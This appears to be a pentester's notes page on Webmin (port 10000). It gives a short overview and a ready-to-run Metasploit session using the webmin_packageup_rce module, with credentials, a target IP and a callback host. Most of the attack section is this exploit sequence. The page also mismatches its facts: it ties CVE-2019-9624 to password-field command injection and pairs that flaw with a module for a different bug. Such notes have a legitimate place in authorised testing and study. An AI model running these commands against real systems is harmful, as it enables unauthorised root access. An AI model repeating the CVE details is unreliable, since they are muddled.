# Webmin (10000)

## 101

Webmin is a **web-based system administration interface** for Unix-like systems, typically running on port `10000` by default. It allows administrators to manage various aspects of a system—such as users, services, packages, and configuration files—entirely through a browser, without needing to use the terminal or SSH.

## Attacks

### RCE

[CVE-2019-9624](https://nvd.nist.gov/vuln/detail/cve-2019-9624) is a RCE in Webmin versions prior to `1.910`. It specifically affects installations where the `old password` option is enabled for password changes. In vulnerable versions, if a user submits a password change request, Webmin checks the old password—but only if the `old password` option is enabled in the configuration. Due to improper input handling, attackers could craft a request to inject OS commands through the `old` password field. These commands would then be executed with the privileges of the Webmin process (often `root`).

MSF's [`webmin_packageup_rce`](https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce/) module can be used:

{% code overflow="wrap" %}
```bash
msf6 > use exploit/linux/http/webmin_packageup_rce
msf6 exploit(linux/http/webmin_packageup_rce) > set password Password6543
msf6 exploit(linux/http/webmin_packageup_rce) > set username admin
msf6 exploit(linux/http/webmin_packageup_rce) > set rhosts 172.16.1.1
msf6 exploit(linux/http/webmin_packageup_rce) > set rport 10000
msf6 exploit(linux/http/webmin_packageup_rce) > set lhost tun0
msf6 exploit(linux/http/webmin_packageup_rce) > run
```
{% endcode %}
